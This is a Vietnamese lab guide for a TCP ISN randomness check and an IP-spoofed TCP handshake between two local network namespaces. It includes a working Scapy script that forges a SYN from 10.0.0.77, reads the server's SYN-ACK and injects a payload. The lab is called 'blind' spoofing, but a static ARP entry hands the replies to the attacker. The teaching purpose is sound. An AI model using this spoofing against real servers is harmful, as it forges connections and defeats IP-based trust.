# HƯỚNG DẪN THỰC HÀNH: LAB 01
## TCP ISN Prediction & Blind Spoofing Attack

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Đo lường độ ngẫu nhiên của số thứ tự ban đầu TCP (ISN) theo RFC 6528, sau đó thực hiện tấn công bắt tay 3 bước TCP giả mạo IP nguồn (Blind TCP Spoofing) và bơm tải dữ liệu.
- **Topology:**
  - `h1`: `10.0.0.1/24` (Attacker) trên `veth1`
  - `h2`: `10.0.0.2/24` (Victim Server) trên `veth2`
  - Địa chỉ giả mạo (Spoofed IP): `10.0.0.77`

---

### 2. CÁCH 1: CHẠY NHANH TỪ CÁC SCRIPT CÓ SẴN

Nếu bạn đang đứng ở thư mục gốc của project hoặc đã copy thư mục `scripts/` vào máy ảo:

```bash
# Bước 1: Khởi tạo topology mạng h1 <-> h2
sudo bash docs/progress/LAB01/scripts/setup_pair.sh

# Bước 2: Đo lường và lấy mẫu 30 ISNs để kiểm tra độ ngẫu nhiên
sudo ip netns exec h1 python3 docs/progress/LAB01/scripts/isn_sampler.py

# Bước 3: Mở dịch vụ lắng nghe trên Victim (h2:8080) trong background
sudo ip netns exec h2 ncat -lvk -p 8080 > /tmp/victim_ncat.log 2>&1 &

# Bước 4: Chạy script giả mạo bắt tay 3 bước với IP 10.0.0.77
sudo ip netns exec h1 python3 docs/progress/LAB01/scripts/spoof_sniff.py

# Bước 5: Kiểm tra dữ liệu bơm vào máy chủ nạn nhân
cat /tmp/victim_ncat.log
```

---

### 3. CÁCH 2: CHẠY ĐỘC LẬP BẰNG COPY-PASTE (STANDALONE)

Bạn có thể copy toàn bộ khối lệnh dưới đây và dán trực tiếp vào Terminal Kali Linux:

```bash
# === 1. TẠO MÔI TRƯỜNG MẠNG VÀ TĨNH ARP CHO SPOOFED IP ===
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo ip netns add h1
sudo ip netns add h2
sudo ip link add veth1 type veth peer name veth2
sudo ip link set veth1 netns h1
sudo ip link set veth2 netns h2
sudo ip netns exec h1 ip link set dev lo up
sudo ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
sudo ip netns exec h1 ip link set dev veth1 up
sudo ip netns exec h2 ip link set dev lo up
sudo ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
sudo ip netns exec h2 ip link set dev veth2 up

# Cấu hình tĩnh ARP để h2 gửi phản hồi của IP giả mạo (10.0.0.77) tới veth1
VETH1_MAC=$(sudo ip netns exec h1 cat /sys/class/net/veth1/address)
sudo ip netns exec h2 ip neigh replace 10.0.0.77 lladdr "$VETH1_MAC" dev veth2

# === 2. BẮT ĐẦU LẮNG NGHE TRÊN NẠN NHÂN ===
sudo ip netns exec h2 ncat -lvk -p 8080 > /tmp/victim_ncat.log 2>&1 &
NCAT_PID=$!
sleep 1

# === 3. THỰC HIỆN TẤN CÔNG BẮT TAY GIẢ MẠO BẰNG PYTHON SCAPY ===
sudo ip netns exec h1 python3 -c '
from scapy.all import IP, TCP, send, sniff, Raw
import random

target_ip = "10.0.0.2"
target_port = 8080
spoofed_ip = "10.0.0.77"
sport = random.randint(30000, 60000)
my_isn = 1000

print("[*] Sending spoofed SYN from", spoofed_ip)
syn = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="S", seq=my_isn)
send(syn, iface="veth1", verbose=0)

print("[*] Sniffing SYN-ACK...")
pkts = sniff(iface="veth1", filter=f"tcp and src host {target_ip} and dst host {spoofed_ip} and src port {target_port}", count=1, timeout=3)
if pkts:
    syn_ack = pkts[0]
    server_isn = syn_ack[TCP].seq
    print(f"[+] Got SYN-ACK! Server ISN={server_isn}")
    ack = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="A", seq=my_isn+1, ack=server_isn+1)
    send(ack, iface="veth1", verbose=0)
    
    payload = b"hello-from-spoofed-source\n"
    psh = IP(src=spoofed_ip, dst=target_ip) / TCP(sport=sport, dport=target_port, flags="PA", seq=my_isn+1, ack=server_isn+1) / Raw(load=payload)
    send(psh, iface="veth1", verbose=0)
    print("[+] Handshake complete & Payload delivered successfully!")
else:
    print("[-] Timeout waiting for SYN-ACK")
'

# === 4. XEM KẾT QUẢ VÀ DỌN DẸP ===
sleep 1
echo "=== DỮ LIỆU NHẬN ĐƯỢC TẠI SERVER VICTIM ==="
cat /tmp/victim_ncat.log
kill $NCAT_PID 2>/dev/null || true
```

---

### 4. QUAN SÁT & TIÊU CHÍ THÀNH CÔNG
1. **Quan sát Log Server:** File `/tmp/victim_ncat.log` xuất hiện kết nối từ `10.0.0.77` và nội dung chuỗi `hello-from-spoofed-source`.
2. **Quan sát tcpdump:** Gói ACK của h2 gửi về `10.0.0.77` có số ACK = `my_isn + 1 + len(payload) = 1000 + 1 + 26 = 1027`.

---

### 5. LỆNH DỌN DẸP MÔI TRƯỜNG
```bash
sudo pkill -f ncat 2>/dev/null || true
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo rm -f /tmp/victim_ncat.log
```

